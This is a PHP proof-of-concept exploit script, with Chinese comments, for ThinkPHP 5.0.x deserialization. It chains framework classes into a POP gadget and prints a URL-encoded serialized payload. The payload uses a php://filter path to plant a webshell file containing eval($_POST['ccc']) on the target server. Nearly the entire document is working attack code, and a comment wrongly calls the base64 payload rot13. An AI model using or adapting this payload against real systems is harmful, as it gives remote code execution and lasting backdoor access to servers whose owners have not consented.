<?php
//参考https://drivertom.blogspot.com/2020/01/thinkphp-v50x-pop-chainpoc.html
//Windows兼容性问题解决参考:https://xz.aliyun.com/t/7457#toc-3
//运行后生成a.php6218150bbcad1e6eec78da4604c4b6c7.php 其中包含了一个eval($_POST['ccc'])
//File类
namespace think\cache\driver;
class File
{
    protected $tag='sodayo';
    protected $options = [
        'expire'        => 0,
        'cache_subdir'  => false,
        'prefix'        => false,
        'path'          => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php', //这里是欲写入的PHP被rot13后的结果
        'data_compress' => false,
    ];
}


//Memcached类
namespace think\session\driver;
use think\cache\driver\File;
class Memcached
{
    protected $handler;
    function __construct()
    {
        $this->handler=new File();
    }
}


//Output类
namespace think\console;
use think\session\driver\Memcached;
class Output
{
    protected $styles = ['removeWhereField'];
    function __construct()
    {
        $this->handle=new Memcached();
    }
}
//HasOne类
namespace think\model\relation;
use think\console\Output;
class HasOne
{
    //protected $foreignKey="sss"; //$this->query->removeWhereField($this->foreignKey)
    function __construct()
    {
        $this->query=new Output();
    }
}


//Pivot类
namespace think\model;
use think\model\relation\HasOne;
class Pivot
{
    protected $append = ['getError'];
    public function __construct()
    {
        $this->error=new HasOne();
    }
}
//Windows类
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
$x=new Windows();

echo urlencode(serialize($x));